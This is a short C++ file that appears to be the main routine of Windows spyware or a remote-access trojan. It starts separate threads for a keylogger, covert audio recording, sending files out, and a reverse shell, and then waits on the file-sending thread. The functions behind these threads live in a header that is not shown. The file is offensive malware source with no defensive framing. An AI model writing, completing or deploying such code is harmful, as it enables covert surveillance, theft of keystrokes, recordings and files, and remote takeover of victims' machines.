#include "headers/headers.hpp"

using namespace std;

atomic<std::string *>filesToPostSend((string *)(new string));

int main(){
    HANDLE audioThread, keyloggerThread, fileSendThread, reverseShellThread;
    DWORD audioThreadId, keyloggerThreadId, fileSendThreadId, reverseShellThreadID;
    beginKeyloggerThread(keyloggerThread, reinterpret_cast<LPDWORD>(&keyloggerThreadId));
    beginAudioRecording(audioThread, reinterpret_cast<LPDWORD>(&audioThreadId));
    beginfileSendingThread(fileSendThread, reinterpret_cast<LPDWORD>(&fileSendThreadId));
    beginReverseShellThread(reverseShellThread, reinterpret_cast<LPDWORD>(&reverseShellThreadID));
    WaitForSingleObject(fileSendThread, INFINITE);
    return 0;
}